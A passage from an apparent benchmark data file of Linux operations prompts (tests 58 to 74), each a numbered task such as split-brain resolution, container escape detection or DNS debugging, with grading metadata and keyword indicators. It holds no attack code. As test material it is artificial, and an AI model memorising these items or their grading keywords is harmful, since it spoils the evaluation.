          "content": "\nCreate a kernel panic analysis toolkit that:\n1. Parses kdump/crash dumps to extract panic information\n2. Analyzes the call stack to identify the faulting module and function\n3. Decodes kernel symbols and inline functions from vmlinux\n4. Checks for known hardware issues based on MCE (Machine Check Exception) logs\n5. Analyzes kernel taint flags and their implications\n6. Searches for similar panics in kernel bugzilla and LKML\n7. Generates a disassembly of the faulting code section\n8. Checks for race conditions based on CPU and lock states\n9. Analyzes memory corruption patterns if present\n10. Produces a detailed report with debugging recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_58",
      "name": "Test 58: Distributed System Split-Brain Resolution",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nDesign a split-brain detection and resolution system for a distributed database cluster:\n1. Implement a quorum-based node health checker using multiple communication channels\n2. Detect network partitions using both heartbeat and application-level checks\n3. Implement a STONITH (Shoot The Other Node In The Head) mechanism safely\n4. Create a data reconciliation process for diverged replicas\n5. Track and resolve conflicting writes using vector clocks\n6. Implement automatic failover with data consistency guarantees\n7. Create a partition history tracker to prevent repeated split-brains\n8. Design a manual override system for operator intervention\n9. Generate detailed logs of all decisions for post-mortem analysis\nInclude safeguards against data loss and cascading failures.\n",
      "messages": [
        {
          "role": "user",
          "content": "\nDesign a split-brain detection and resolution system for a distributed database cluster:\n1. Implement a quorum-based node health checker using multiple communication channels\n2. Detect network partitions using both heartbeat and application-level checks\n3. Implement a STONITH (Shoot The Other Node In The Head) mechanism safely\n4. Create a data reconciliation process for diverged replicas\n5. Track and resolve conflicting writes using vector clocks\n6. Implement automatic failover with data consistency guarantees\n7. Create a partition history tracker to prevent repeated split-brains\n8. Design a manual override system for operator intervention\n9. Generate detailed logs of all decisions for post-mortem analysis\nInclude safeguards against data loss and cascading failures.\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "technical",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_59",
      "name": "Test 59: Performance Regression Detection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild an automated performance regression detection system:\n1. Collect baseline performance metrics using perf, eBPF, and application metrics\n2. Implement statistical analysis to detect significant deviations (t-test, z-score)\n3. Correlate regressions with system changes (kernel updates, deployments, config changes)\n4. Use flame graphs to compare CPU usage patterns between versions\n5. Analyze memory allocation patterns for increased pressure\n6. Track syscall latency changes using ftrace\n7. Monitor network stack performance changes\n8. Implement automatic bisection to find the commit causing regression\n9. Generate detailed comparison reports with specific bottleneck identification\n10. Create rollback recommendations based on severity\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild an automated performance regression detection system:\n1. Collect baseline performance metrics using perf, eBPF, and application metrics\n2. Implement statistical analysis to detect significant deviations (t-test, z-score)\n3. Correlate regressions with system changes (kernel updates, deployments, config changes)\n4. Use flame graphs to compare CPU usage patterns between versions\n5. Analyze memory allocation patterns for increased pressure\n6. Track syscall latency changes using ftrace\n7. Monitor network stack performance changes\n8. Implement automatic bisection to find the commit causing regression\n9. Generate detailed comparison reports with specific bottleneck identification\n10. Create rollback recommendations based on severity\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_60",
      "name": "Test 60: Storage Array Failure Recovery",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nHandle a critical storage array failure scenario:\n1. Detect failed drives in RAID arrays using mdadm and hardware RAID tools\n2. Assess data integrity across remaining drives using checksums\n3. Implement emergency read-only mode to prevent further corruption\n4. Create a priority-based data recovery plan based on business impact\n5. Use ddrescue to recover data from failing drives with bad sectors\n6. Rebuild RAID arrays with optimal stripe size for recovery performance\n7. Implement continuous backup during recovery to prevent data loss\n8. Monitor array rebuild progress and estimate completion time\n9. Validate recovered data integrity using application-level checks\n10. Create a post-mortem report with failure analysis and prevention recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nHandle a critical storage array failure scenario:\n1. Detect failed drives in RAID arrays using mdadm and hardware RAID tools\n2. Assess data integrity across remaining drives using checksums\n3. Implement emergency read-only mode to prevent further corruption\n4. Create a priority-based data recovery plan based on business impact\n5. Use ddrescue to recover data from failing drives with bad sectors\n6. Rebuild RAID arrays with optimal stripe size for recovery performance\n7. Implement continuous backup during recovery to prevent data loss\n8. Monitor array rebuild progress and estimate completion time\n9. Validate recovered data integrity using application-level checks\n10. Create a post-mortem report with failure analysis and prevention recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_61",
      "name": "Test 61: Memory Leak Detection in Production",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a production-safe memory leak detection and analysis system:\n1. Use process_vm_readv to read process memory without attaching\n2. Track heap growth patterns over time using /proc/PID/status\n3. Analyze malloc patterns using LD_PRELOAD interception\n4. Identify leaked objects using conservative garbage collection scanning\n5. Generate heap allocation flame graphs for visualization\n6. Correlate memory growth with application events and requests\n7. Implement automatic heap dumping when thresholds are exceeded\n8. Analyze core dumps for memory leak patterns without stopping the process\n9. Track native memory leaks in JNI or other FFI code\n10. Generate actionable reports with specific allocation sites\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a production-safe memory leak detection and analysis system:\n1. Use process_vm_readv to read process memory without attaching\n2. Track heap growth patterns over time using /proc/PID/status\n3. Analyze malloc patterns using LD_PRELOAD interception\n4. Identify leaked objects using conservative garbage collection scanning\n5. Generate heap allocation flame graphs for visualization\n6. Correlate memory growth with application events and requests\n7. Implement automatic heap dumping when thresholds are exceeded\n8. Analyze core dumps for memory leak patterns without stopping the process\n9. Track native memory leaks in JNI or other FFI code\n10. Generate actionable reports with specific allocation sites\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_62",
      "name": "Test 62: Network Congestion Diagnosis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_networking",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux networking",
      "prompt": "\nBuild a comprehensive network congestion diagnostic tool:\n1. Monitor TCP retransmission rates and patterns per connection\n2. Analyze packet capture for congestion indicators (ECN, window scaling)\n3. Track buffer bloat symptoms using ping RTT variance\n4. Measure actual vs advertised bandwidth using various algorithms\n5. Identify congestion sources: local, ISP, or remote\n6. Analyze traffic shaping and QoS policy effectiveness\n7. Detect and quantify packet loss patterns (random vs burst)\n8. Monitor TCP congestion window evolution\n9. Identify optimal TCP congestion control algorithm for workload\n10. Generate network optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a comprehensive network congestion diagnostic tool:\n1. Monitor TCP retransmission rates and patterns per connection\n2. Analyze packet capture for congestion indicators (ECN, window scaling)\n3. Track buffer bloat symptoms using ping RTT variance\n4. Measure actual vs advertised bandwidth using various algorithms\n5. Identify congestion sources: local, ISP, or remote\n6. Analyze traffic shaping and QoS policy effectiveness\n7. Detect and quantify packet loss patterns (random vs burst)\n8. Monitor TCP congestion window evolution\n9. Identify optimal TCP congestion control algorithm for workload\n10. Generate network optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "security",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_63",
      "name": "Test 63: Container Escape Detection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_containers",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux containers",
      "prompt": "\nImplement a container escape detection and prevention system:\n1. Monitor /proc/*/root symlinks for container boundary violations\n2. Track capability usage and detect suspicious capability requests\n3. Monitor namespace changes using inotify on /proc/*/ns/\n4. Detect privileged container indicators and runtime changes\n5. Track mount operations that could lead to host filesystem access\n6. Monitor kernel module loading attempts from containers\n7. Detect ptrace usage that could indicate escape attempts\n8. Track cgroup escape attempts through release_agent\n9. Monitor for known container escape exploits (CVE patterns)\n10. Implement real-time alerting and automatic container termination\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement a container escape detection and prevention system:\n1. Monitor /proc/*/root symlinks for container boundary violations\n2. Track capability usage and detect suspicious capability requests\n3. Monitor namespace changes using inotify on /proc/*/ns/\n4. Detect privileged container indicators and runtime changes\n5. Track mount operations that could lead to host filesystem access\n6. Monitor kernel module loading attempts from containers\n7. Detect ptrace usage that could indicate escape attempts\n8. Track cgroup escape attempts through release_agent\n9. Monitor for known container escape exploits (CVE patterns)\n10. Implement real-time alerting and automatic container termination\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "devops",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_64",
      "name": "Test 64: Elasticsearch Cluster Recovery",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nHandle a failed Elasticsearch cluster recovery:\n1. Assess cluster health and identify failed nodes using _cluster/health\n2. Analyze shard allocation failures using _cluster/allocation/explain\n3. Force allocate stalled shards with allocation decision override\n4. Recover corrupted indices from translog using recovery API\n5. Reindex corrupted data using scroll and bulk APIs\n6. Optimize shard allocation for faster recovery\n7. Monitor recovery progress and adjust thread pools\n8. Handle split-brain scenarios with master election\n9. Validate data integrity post-recovery using checksums\n10. Implement preventive measures based on failure analysis\n",
      "messages": [
        {
          "role": "user",
          "content": "\nHandle a failed Elasticsearch cluster recovery:\n1. Assess cluster health and identify failed nodes using _cluster/health\n2. Analyze shard allocation failures using _cluster/allocation/explain\n3. Force allocate stalled shards with allocation decision override\n4. Recover corrupted indices from translog using recovery API\n5. Reindex corrupted data using scroll and bulk APIs\n6. Optimize shard allocation for faster recovery\n7. Monitor recovery progress and adjust thread pools\n8. Handle split-brain scenarios with master election\n9. Validate data integrity post-recovery using checksums\n10. Implement preventive measures based on failure analysis\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_65",
      "name": "Test 65: SSL/TLS Debugging Suite",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive SSL/TLS debugging toolkit:\n1. Analyze certificate chains for validity and trust issues\n2. Detect weak cipher suites and protocol versions\n3. Test for common vulnerabilities (POODLE, BEAST, CRIME)\n4. Monitor certificate expiration and renewal failures\n5. Debug SNI (Server Name Indication) issues\n6. Analyze TLS handshake failures with detailed error codes\n7. Test OCSP stapling and revocation checking\n8. Verify certificate pinning implementation\n9. Debug mutual TLS authentication issues\n10. Generate detailed reports with remediation steps\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a comprehensive SSL/TLS debugging toolkit:\n1. Analyze certificate chains for validity and trust issues\n2. Detect weak cipher suites and protocol versions\n3. Test for common vulnerabilities (POODLE, BEAST, CRIME)\n4. Monitor certificate expiration and renewal failures\n5. Debug SNI (Server Name Indication) issues\n6. Analyze TLS handshake failures with detailed error codes\n7. Test OCSP stapling and revocation checking\n8. Verify certificate pinning implementation\n9. Debug mutual TLS authentication issues\n10. Generate detailed reports with remediation steps\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_66",
      "name": "Test 66: Microservices Tracing Analysis",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a distributed tracing analysis system for microservices:\n1. Correlate traces across multiple services using trace IDs\n2. Identify critical path and bottlenecks in request flow\n3. Detect retry storms and cascading failures\n4. Analyze service dependency failures and timeout propagation\n5. Calculate true end-to-end latency including queue times\n6. Identify missing or broken trace spans\n7. Detect circuit breaker activations and their impact\n8. Analyze distributed transaction failures\n9. Generate service dependency maps from trace data\n10. Provide optimization recommendations for identified bottlenecks\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a distributed tracing analysis system for microservices:\n1. Correlate traces across multiple services using trace IDs\n2. Identify critical path and bottlenecks in request flow\n3. Detect retry storms and cascading failures\n4. Analyze service dependency failures and timeout propagation\n5. Calculate true end-to-end latency including queue times\n6. Identify missing or broken trace spans\n7. Detect circuit breaker activations and their impact\n8. Analyze distributed transaction failures\n9. Generate service dependency maps from trace data\n10. Provide optimization recommendations for identified bottlenecks\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_67",
      "name": "Test 67: Hypervisor Performance Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nDebug virtualization performance issues at the hypervisor level:\n1. Analyze VM exit reasons and frequencies using kvm_stat\n2. Monitor EPT/NPT violations and shadow page table overhead\n3. Track CPU steal time and hypervisor scheduling fairness\n4. Analyze memory ballooning impact on guest performance\n5. Monitor SR-IOV and virtio device performance\n6. Detect NUMA misalignment between host and guest\n7. Track live migration impact on application performance\n8. Analyze hypervisor CPU overcommit ratios\n9. Monitor nested virtualization overhead\n10. Generate tuning recommendations for both host and guest\n",
      "messages": [
        {
          "role": "user",
          "content": "\nDebug virtualization performance issues at the hypervisor level:\n1. Analyze VM exit reasons and frequencies using kvm_stat\n2. Monitor EPT/NPT violations and shadow page table overhead\n3. Track CPU steal time and hypervisor scheduling fairness\n4. Analyze memory ballooning impact on guest performance\n5. Monitor SR-IOV and virtio device performance\n6. Detect NUMA misalignment between host and guest\n7. Track live migration impact on application performance\n8. Analyze hypervisor CPU overcommit ratios\n9. Monitor nested virtualization overhead\n10. Generate tuning recommendations for both host and guest\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_68",
      "name": "Test 68: Service Mesh Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a service mesh (Istio/Linkerd) debugging toolkit:\n1. Analyze Envoy proxy configurations and inconsistencies\n2. Debug mTLS certificate propagation issues\n3. Trace policy enforcement failures and RBAC denials\n4. Monitor sidecar injection failures and pod readiness\n5. Analyze circuit breaker and retry policy effectiveness\n6. Debug service discovery and endpoint propagation\n7. Monitor control plane to data plane communication\n8. Analyze telemetry data collection overhead\n9. Debug traffic splitting and canary deployment issues\n10. Generate mesh configuration optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a service mesh (Istio/Linkerd) debugging toolkit:\n1. Analyze Envoy proxy configurations and inconsistencies\n2. Debug mTLS certificate propagation issues\n3. Trace policy enforcement failures and RBAC denials\n4. Monitor sidecar injection failures and pod readiness\n5. Analyze circuit breaker and retry policy effectiveness\n6. Debug service discovery and endpoint propagation\n7. Monitor control plane to data plane communication\n8. Analyze telemetry data collection overhead\n9. Debug traffic splitting and canary deployment issues\n10. Generate mesh configuration optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_69",
      "name": "Test 69: JVM Production Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nBuild a production JVM debugging and analysis toolkit:\n1. Attach to running JVM using JVM TI without stopping it\n2. Analyze thread dumps for deadlocks and contention\n3. Monitor GC behavior and predict out-of-memory conditions\n4. Track method-level CPU usage using async-profiler\n5. Analyze heap dumps for memory leaks using MAT algorithms\n6. Monitor JIT compilation and deoptimization events\n7. Track native memory usage including direct buffers\n8. Analyze class loading patterns and metaspace usage\n9. Debug JNI issues and native crashes\n10. Generate performance tuning recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a production JVM debugging and analysis toolkit:\n1. Attach to running JVM using JVM TI without stopping it\n2. Analyze thread dumps for deadlocks and contention\n3. Monitor GC behavior and predict out-of-memory conditions\n4. Track method-level CPU usage using async-profiler\n5. Analyze heap dumps for memory leaks using MAT algorithms\n6. Monitor JIT compilation and deoptimization events\n7. Track native memory usage including direct buffers\n8. Analyze class loading patterns and metaspace usage\n9. Debug JNI issues and native crashes\n10. Generate performance tuning recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_70",
      "name": "Test 70: BGP Routing Anomaly Detection",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nImplement a BGP routing anomaly detection system:\n1. Monitor BGP session states and flapping patterns\n2. Detect route hijacking attempts using RPKI validation\n3. Analyze AS path anomalies and routing loops\n4. Track prefix announcement changes and leaks\n5. Monitor convergence time during routing changes\n6. Detect BGP optimizer or traffic engineering anomalies\n7. Analyze community attribute usage and policies\n8. Monitor route dampening and its impact\n9. Track IPv6 vs IPv4 routing consistency\n10. Generate alerts for routing security incidents\n",
      "messages": [
        {
          "role": "user",
          "content": "\nImplement a BGP routing anomaly detection system:\n1. Monitor BGP session states and flapping patterns\n2. Detect route hijacking attempts using RPKI validation\n3. Analyze AS path anomalies and routing loops\n4. Track prefix announcement changes and leaks\n5. Monitor convergence time during routing changes\n6. Detect BGP optimizer or traffic engineering anomalies\n7. Analyze community attribute usage and policies\n8. Monitor route dampening and its impact\n9. Track IPv6 vs IPv4 routing consistency\n10. Generate alerts for routing security incidents\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_71",
      "name": "Test 71: Distributed Lock Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a distributed lock debugging and analysis system:\n1. Monitor lock acquisition patterns across distributed systems\n2. Detect deadlocks in distributed locking mechanisms\n3. Track lock hold times and identify long-running transactions\n4. Analyze lock contention and fairness issues\n5. Monitor Zookeeper/etcd/Consul lock performance\n6. Detect orphaned locks from crashed clients\n7. Implement lock timeout and renewal debugging\n8. Track distributed transaction coordination issues\n9. Analyze optimistic vs pessimistic locking performance\n10. Generate locking strategy optimization recommendations\n",
      "messages": [
        {
          "role": "user",
          "content": "\nCreate a distributed lock debugging and analysis system:\n1. Monitor lock acquisition patterns across distributed systems\n2. Detect deadlocks in distributed locking mechanisms\n3. Track lock hold times and identify long-running transactions\n4. Analyze lock contention and fairness issues\n5. Monitor Zookeeper/etcd/Consul lock performance\n6. Detect orphaned locks from crashed clients\n7. Implement lock timeout and renewal debugging\n8. Track distributed transaction coordination issues\n9. Analyze optimistic vs pessimistic locking performance\n10. Generate locking strategy optimization recommendations\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_72",
      "name": "Test 72: Cloud Resource Optimization",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_monitoring",
      "reasoning_type": "multi_hop",
      "api_type": "chat",
      "description": "Instruct test case for linux monitoring",
      "prompt": "\nBuild a cloud resource waste detection and optimization system:\n1. Identify idle or underutilized compute instances\n2. Detect unattached storage volumes and snapshots\n3. Analyze network transfer costs and optimize routing\n4. Identify over-provisioned databases and caches\n5. Track reserved instance utilization and recommendations\n6. Monitor spot instance interruptions and fallback strategies\n7. Analyze auto-scaling effectiveness and thresholds\n8. Detect orphaned resources from failed deployments\n9. Optimize storage classes based on access patterns\n10. Generate cost optimization report with specific actions\n",
      "messages": [
        {
          "role": "user",
          "content": "\nBuild a cloud resource waste detection and optimization system:\n1. Identify idle or underutilized compute instances\n2. Detect unattached storage volumes and snapshots\n3. Analyze network transfer costs and optimize routing\n4. Identify over-provisioned databases and caches\n5. Track reserved instance utilization and recommendations\n6. Monitor spot instance interruptions and fallback strategies\n7. Analyze auto-scaling effectiveness and thresholds\n8. Detect orphaned resources from failed deployments\n9. Optimize storage classes based on access patterns\n10. Generate cost optimization report with specific actions\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "multi_hop",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_73",
      "name": "Test 73: Kafka Production Issues",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nDebug and resolve Kafka production issues:\n1. Analyze partition leadership imbalances and broker hotspots\n2. Debug consumer lag and identify slow consumers\n3. Monitor ISR (In-Sync Replica) shrinking and expansion\n4. Analyze log segment rotation and retention issues\n5. Debug producer timeouts and batch sizing problems\n6. Monitor controller failover and metadata propagation\n7. Analyze topic compaction effectiveness and tombstones\n8. Debug exactly-once semantics violations\n9. Monitor broker JVM and OS-level metrics\n10. Generate cluster rebalancing and optimization plan\n",
      "messages": [
        {
          "role": "user",
          "content": "\nDebug and resolve Kafka production issues:\n1. Analyze partition leadership imbalances and broker hotspots\n2. Debug consumer lag and identify slow consumers\n3. Monitor ISR (In-Sync Replica) shrinking and expansion\n4. Analyze log segment rotation and retention issues\n5. Debug producer timeouts and batch sizing problems\n6. Monitor controller failover and metadata propagation\n7. Analyze topic compaction effectiveness and tombstones\n8. Debug exactly-once semantics violations\n9. Monitor broker JVM and OS-level metrics\n10. Generate cluster rebalancing and optimization plan\n"
        }
      ],
      "parameters": {
        "max_tokens": 16384,
        "temperature": 0.1,
        "stream": false
      },
      "metadata": {
        "expected_length": "long",
        "complexity": "high",
        "context_size": "large",
        "domain": "general",
        "timeout_seconds": 600,
        "reasoning_patterns": [
          "technical_analysis",
          "system_design",
          "problem_solving"
        ]
      },
      "evaluation_config": {
        "reasoning_type": "general",
        "custom_weights": null,
        "expected_indicators": [
          "first",
          "then",
          "configure",
          "setup",
          "script",
          "command"
        ]
      }
    },
    {
      "id": "linux_test_74",
      "name": "Test 74: DNS Infrastructure Debugging",
      "suite": "Instruct Linux Complex Tests",
      "category": "linux_general",
      "reasoning_type": "general",
      "api_type": "chat",
      "description": "Instruct test case for linux general",
      "prompt": "\nCreate a comprehensive DNS infrastructure debugging toolkit:\n1. Trace DNS query path through recursive and authoritative servers\n2. Detect DNS cache poisoning attempts and validation failures\n3. Analyze DNSSEC chain of trust and signature validation\n4. Monitor DNS query patterns for DDoS and amplification attacks\n5. Debug GeoDNS and anycast routing issues\n6. Analyze DNS load balancing effectiveness\n7. Track NXDOMAIN rates and potential typosquatting\n8. Monitor zone transfer security and AXFR/IXFR issues\n9. Debug EDNS and TCP fallback problems\n10. Generate DNS infrastructure hardening recommendations\n",
      "messages": [
        {
          "role": "user",
